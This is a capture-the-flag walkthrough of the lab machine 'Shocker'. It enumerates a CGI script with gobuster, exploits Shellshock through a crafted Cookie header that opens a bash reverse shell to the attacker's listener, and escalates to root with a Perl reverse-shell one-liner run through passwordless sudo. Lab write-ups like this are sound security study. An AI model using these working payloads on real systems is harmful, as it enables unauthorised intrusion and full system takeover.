# Shocker

# Recon/Enum
```
$ gobuster -u http://$IP -w /usr/share/wordlists/dirb/wordlists/small.txt
=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.56/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/wordlists/small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2021/09/27 21:40:31 Starting gobuster
=====================================================
/cgi-bin/ (Status: 403)
=====================================================
2021/09/27 21:40:48 Finished
=====================================================
```

Checking /cgi-bin/
```
gobuster -u http://$IP/cgi-bin/ -w /usr/share/wordlists/dirb/wordlists/small.txt -x sh,pl

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.56/cgi-bin/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/wordlists/small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : sh,pl
[+] Timeout      : 10s
=====================================================
2021/09/27 21:45:06 Starting gobuster
=====================================================
/user.sh (Status: 200)
=====================================================
2021/09/27 21:45:49 Finished
=====================================================
```

Looking at the request/response for /cgi-bin/user.sh
```
Content-Type: text/plain

Just an uptime test script

 20:54:51 up 11 min,  0 users,  load average: 0.00, 0.02, 0.00

GET /cgi-bin/user.sh HTTP/1.1

Host: 10.10.10.56

Connection: keep-alive

Cache-Control: max-age=0

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (X11; Linux x86\_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

Sec-GPC: 1

Accept-Encoding: gzip, deflate

Accept-Language: en-US,en;q=0.9

```
It is possible to temper with the GET request and get a shell exploiting the shellshock vulnerability

```
We're gonna use telnet to send a GET request 
First, set up the listener

nc -lnvp 64444
Listening on 0.0.0.0 64444

After that, send the request

telnet 10.10.10.56 80
Trying 10.10.10.56...
Connected to 10.10.10.56.
Escape character is '^]'.
GET /cgi-bin/user.sh HTTP/1.1
Host: 10.10.10.56
Cookie: () { :;}; echo; /bin/bash -i >& /dev/tcp/10.10.14.2/64444 0>&1


```
Once the connection is established and the request sent, you should get a shell with user privileges

```
Connection received on 10.10.10.56 35878
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$

shelly@Shocker:/usr/lib/cgi-bin$ whoami
whoami
shelly
```

The next step is to elevate privileges
After a bit of futher enumeration we find that shelly can run perl commands as root and we can use this to get a privileged shell
```
cd /dev/shm
shelly@Shocker:/dev/shm$ sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```
So, running a perl command to get a reverse shell
```
shelly@Shocker:/usr/lib/cgi-bin$ sudo /usr/bin/perl -e 'use Socket;$i="10.10.14.2";$p=62000;socket(S,PF\_INET,SOCK\_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr\_in($p,inet\_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
We get root
```
nc -lnvp 62000
Listening on 0.0.0.0 62000
Connection received on 10.10.10.56 48038
/bin/sh: 0: can't access tty; job control turned off
\# whoami
root
\# cat $(find / -type f -name "root.txt" 2\>/dev/null)
25d01(...)1e44a2a316
```

